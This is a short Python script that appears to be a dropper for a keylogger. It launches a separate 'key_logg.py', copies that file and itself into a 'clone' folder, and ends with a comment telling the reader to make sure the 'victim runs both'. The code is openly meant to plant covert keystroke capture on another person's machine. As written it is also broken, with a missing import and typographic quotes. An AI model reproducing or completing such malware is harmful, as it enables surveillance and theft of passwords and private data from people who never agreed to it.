from sys import argv


script = argv
name = str(script[0])

cmd = ‘start key_logg.py’
os.system(cmd)
os.mkdir(‘clone’)
os.system(r”copy key_logg.py clone”)
os.system(r”copy ” + name + ” clone”)


# name the key log scriot key_logg.py save in the same folder and make sure victim runs both.
